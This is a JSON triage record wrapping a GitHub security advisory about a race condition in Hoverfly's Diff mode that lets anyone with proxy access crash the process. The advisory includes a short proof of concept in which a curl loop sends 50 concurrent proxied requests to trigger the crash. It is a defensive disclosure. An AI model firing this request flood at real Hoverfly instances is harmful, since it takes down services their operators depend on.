@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/85845881?v=4\", \"events_url\": \"https://api.github.com/users/Kr1shna4garwal/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Kr1shna4garwal/followers\", \"following_url\": \"https://api.github.com/users/Kr1shna4garwal/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Kr1shna4garwal/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Kr1shna4garwal\", \"id\": 85845881, \"login\": \"Kr1shna4garwal\", \"node_id\": \"MDQ6VXNlcjg1ODQ1ODgx\", \"organizations_url\": \"https://api.github.com/users/Kr1shna4garwal/orgs\", \"received_events_url\": \"https://api.github.com/users/Kr1shna4garwal/received_events\", \"repos_url\": \"https://api.github.com/users/Kr1shna4garwal/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Kr1shna4garwal/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Kr1shna4garwal/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Kr1shna4garwal\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-50013\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-362\", \"name\": \"Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\"}, {\"cwe_id\": \"CWE-820\", \"name\": \"Missing Synchronization\"}], \"description\": \"### Summary:\\n\\nWhen Hoverfly is running in Diff mode, the `AddDiff()` function writes to the shared `responsesDiff` map without any synchronization (no mutex). When multiple proxy requests are processed concurrently (the normal case for any proxy), the concurrent map writes trigger Go's built-in race detector which causes a `fatal error: concurrent map read and map write`, immediately killing the entire Hoverfly process. This is trivially exploitable by sending multiple simultaneous requests.\\n\\n### Details:\\n\\n**1. Unsynchronized map access in `AddDiff()` (`core/hoverfly_service.go:417-421`):**\\n\\n```go\\nfunc (hf *Hoverfly) AddDiff(requestView v2.SimpleRequestDefinitionView, diffReport v2.DiffReport) {\\n    if len(diffReport.DiffEntries) > 0 {\\n        diffs := hf.responsesDiff[requestView]                    // UNSYNCHRONIZED READ\\n        hf.responsesDiff[requestView] = append(diffs, diffReport) // UNSYNCHRONIZED WRITE\\n    }\\n}\\n```\\n\\n**2. This function is called from Diff mode processing, which runs concurrently per request (`core/modes/diff_mode.go`):**\\n\\nEach incoming proxy request is handled in its own goroutine by Go's `net/http` server. In Diff mode, each request calls `AddDiff()` after comparing the simulated and actual responses. With multiple concurrent requests, multiple goroutines write to the same map simultaneously.\\n\\n**3. Go's runtime detects concurrent map access and terminates the process:**\\n\\nUnlike data races on simple values (which produce undefined behavior silently), Go's map implementation includes a built-in concurrent access check. When two goroutines access the same map and at least one is writing, the runtime calls `fatal()` which is unrecoverable, it cannot be caught by `recover()`.\\n\\n**4. No mutex protection exists on `responsesDiff`:**\\n\\nThe field is declared as a plain `map[v2.SimpleRequestDefinitionView][]v2.DiffReport` with no associated `sync.RWMutex`. Compare with `hf.state` which properly uses `sync.RWMutex` for its map access.\\n\\n### Environment:\\n\\n- **Hoverfly version:** v1.12.7\\n- **Operating System:** macOS Darwin 25.4.0\\n- **Go version:** 1.26.2\\n- **Configuration:** Hoverfly in Diff mode (`PUT /api/v2/hoverfly/mode {\\\"mode\\\":\\\"diff\\\"}`)\\n\\n### POC:\\n\\n**Step 1: Start Hoverfly and set Diff mode**\\n\\n```bash\\n./hoverfly &\\nsleep 2\\n\\n# Set diff mode\\ncurl -X PUT http://localhost:8888/api/v2/hoverfly/mode \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"mode\\\": \\\"diff\\\"}'\\n\\n# Load a simulation for diff comparison\\ncurl -X PUT http://localhost:8888/api/v2/simulation \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\n    \\\"data\\\": {\\n      \\\"pairs\\\": [{\\n        \\\"request\\\": {\\\"path\\\": [{\\\"matcher\\\": \\\"glob\\\", \\\"value\\\": \\\"*\\\"}]},\\n        \\\"response\\\": {\\\"status\\\": 200, \\\"body\\\": \\\"expected\\\"}\\n      }],\\n      \\\"globalActions\\\": {\\\"delays\\\": [], \\\"delaysLogNormal\\\": []}\\n    },\\n    \\\"meta\\\": {\\\"schemaVersion\\\": \\\"v5.2\\\"}\\n  }'\\n```\\n\\n**Step 2: Send concurrent requests to trigger the race**\\n\\n```bash\\n# Send 50 concurrent requests, race condition triggers within seconds\\nfor i in $(seq 1 50); do\\n    curl -s -x http://localhost:8500 \\\"http://httpbin.org/get?id=$i\\\" &\\ndone\\nwait\\n```\\n\\n**Step 3: Observe the crash**\\n\\n```bash\\n# Check if process is still running\\npgrep -f hoverfly\\n```\\n\\n**crash output on Hoverfly v1.12.7:**\\n\\n```\\nfatal error: concurrent map read and map write\\n\\ngoroutine 892 [running]:\\ngithub.com/SpectoLabs/hoverfly/core.(*Hoverfly).AddDiff(...)\\n        /core/hoverfly_service.go:419\\ngithub.com/SpectoLabs/hoverfly/core/modes.(*DiffMode).Process(...)\\n```\\n\\nThe process crashes with ~50 concurrent requests. In production with real traffic, it crashes almost immediately.\\n\\n### Impact:\\n\\n- **Full denial of service:** The process terminates immediately and cannot be recovered without a restart\\n- **Trivial exploitation:** Any attacker with proxy access can trigger this by sending multiple concurrent requests\\n- **No admin API access required:** Only proxy port access is needed to trigger the crash\\n- **Unrecoverable:** `fatal error` in Go cannot be caught by `recover()` — the process is unconditionally killed\\n- **Affects all Diff mode users:** Any team using Diff mode for API comparison testing is vulnerable\", \"ghsa_id\": \"GHSA-qrh4-p6v4-mrfg\", \"github_reviewed_at\": \"2026-07-14T18:03:10Z\", \"html_url\": \"https://github.com/advisories/GHSA-qrh4-p6v4-mrfg\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-qrh4-p6v4-mrfg\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-50013\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-14T18:03:10Z\", \"references\": [\"https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-qrh4-p6v4-mrfg\", \"https://github.com/SpectoLabs/hoverfly/pull/1227\", \"https://github.com/SpectoLabs/hoverfly/releases/tag/v1.12.8\", \"https://github.com/advisories/GHSA-qrh4-p6v4-mrfg\"], \"repository_advisory_url\": \"https://api.github.com/repos/SpectoLabs/hoverfly/security-advisories/GHSA-qrh4-p6v4-mrfg\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/SpectoLabs/hoverfly\", \"summary\": \"Hoverfly: Process Crash via Concurrent Map Write Race Condition in Diff Mode\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-14T18:03:10Z\", \"url\": \"https://api.github.com/advisories/GHSA-qrh4-p6v4-mrfg\", \"vulnerabilities\": [{\"first_patched_version\": \"1.12.8\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/SpectoLabs/hoverfly\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.12.7\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-qrh4-p6v4-mrfg",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/SpectoLabs/hoverfly: <= 1.12.7"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-50013"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/SpectoLabs/hoverfly"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:55.086533Z",
+  "provenance": {
+    "content_sha256": "b2ed26bd8d9497620135e7d0afa1a33f9efd4e151fd35324771af8296b5f5698",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-14T18:03:10Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-qrh4-p6v4-mrfg",
+  "status": "active",
+  "title": "Hoverfly: Process Crash via Concurrent Map Write Race Condition in Diff Mode",
+  "updated_at": "2026-07-14T18:03:10Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-qrh4-p6v4-mrfg"
+}
